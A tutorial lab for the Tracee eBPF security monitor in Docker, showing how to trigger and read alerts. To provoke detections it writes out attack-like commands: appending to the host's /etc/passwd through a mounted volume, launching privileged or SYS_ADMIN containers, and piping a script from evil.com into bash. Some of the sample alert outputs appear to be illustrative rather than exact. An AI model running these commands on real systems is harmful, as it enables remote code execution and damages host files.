# ğŸ§ª **Tracee Hands-On Lab (Docker Version)**

This lab teaches you:

- âœ” How to run Tracee
- âœ” How to trigger detections (reverse shell, file tampering, privilege escalation)
- âœ” How to analyze alerts
- âœ” How to use filters
- âœ” How to output alerts to a file

No Kubernetes required.

---

## ğŸ“Œ **Prerequisites**

- âœ” Linux host (Ubuntu recommended) (Not WSL)
- âœ” Docker installed
- âœ” Kernel must support eBPF (most modern kernels do)

Verify:

```bash
uname -r
sudo ls /sys/fs/bpf || echo "bpf missing"
```

---

## 1ï¸âƒ£ **Run Tracee in Docker (basic mode)**

Simply run:

```bash
sudo docker run --rm -it --name tracee \
  --privileged --pid=host \
  -v /lib/modules:/lib/modules \
  -v /usr/src:/usr/src \
  -v /etc/os-release:/etc/os-release-host:ro \
  -v /tmp/tracee:/tmp/tracee \
  aquasec/tracee:latest \
  --output json:/tmp/tracee/tracee.json
```

This:

- loads eBPF programs
- starts monitoring
- prints alerts to **your terminal stdout**

ğŸ’¡ **Leave this window open.**

Tracee will display:

```ini
Starting Tracee...
Listening for events...
```

---

## 2ï¸âƒ£ **Open a second terminal** (for attacks)

We will run malicious-like commands to generate alerts.

---

### ğŸ”¹ **Trigger File Modification Alert**

Tracee detects changes in sensitive files.

Run:

```bash
docker run -it --rm -v /etc:/mnt/etc ubuntu bash
```

Inside:

```bash
echo "hack" >> /mnt/etc/passwd
```

Tracee output:

```ini
Suspicious file modification detected
file=/etc/passwd
rule=file_mod
severity=medium
```

Boom. Your first real Tracee alert âœ”

---

### ğŸ”¹ **Trigger Exec into Container Detection**

Run:

```bash
docker exec -it tracee bash
```

Tracee will print something like:

```ini
Container exec detected
pid=4234 image=aquasec/tracee
```

---

### ğŸ”¹ **Trigger Unauthorized Capability Escalation**

Try starting a privileged container:

```bash
docker run --rm -it --privileged ubuntu bash
```

Or give a dangerous capability:

```bash
docker run --rm -it --cap-add SYS_ADMIN ubuntu bash
```

Tracee:

```ini
Alert: suspicious_capability
container started with dangerous capability: SYS_ADMIN
```

---

### ğŸ”¹ **Use Filters (Reduce Noise)**

Only show events for a specific container name:

```bash
docker run --rm \
  --privileged \
  aquasec/tracee:latest \
  --filter container=new
```

Only show â€œhigh severityâ€ alerts:

```bash
--filter "container=new" --filter "event.severity=high"
```

---

## ğŸ“Œ **Output to File (For Analysis)**

```bash
docker run --rm \
  --privileged \
  -v /tmp/tracee:/tmp/tracee \
  aquasec/tracee:latest \
  --output json --output-file /tmp/tracee/logs.json
```

Alerts will appear in:

```ini
/tmp/tracee/logs.json
```

---

## ğŸ“Œ **List Available Rules**

```bash
docker run --rm \
  aquasec/tracee:latest \
  --list --rules
```

Example output:

```ini
reverse_shell
ssh_access
file_integrity
capabilities_escalation
docker_abuse
...
```

---

## ğŸ”¥ Full Attack Simulation Example

Run Tracee:

```bash
docker run --rm --privileged aquasec/tracee:latest
```

In another terminal:

```bash
docker run -it --rm ubuntu bash
apt update && apt install -y curl
curl http://evil.com/shell.sh | bash
```

Tracee will detect:

- suspicious outbound connection
- script execution from pipe
- unknown binary execution

---

## âœ… Summary

| Attack                       | Tracee Detects          |
| ---------------------------- | ----------------------- |
| Reverse shell                | âœ” reverse_shell         |
| Editing /etc/passwd          | âœ” file_mod              |
| Privileged containers        | âœ” capability escalation |
| Exec into containers         | âœ” container_exec        |
| Abnormal file reads          | âœ” sensitive_file_read   |
| Kernel exploitation attempts | âœ” syscall anomalies     |

---
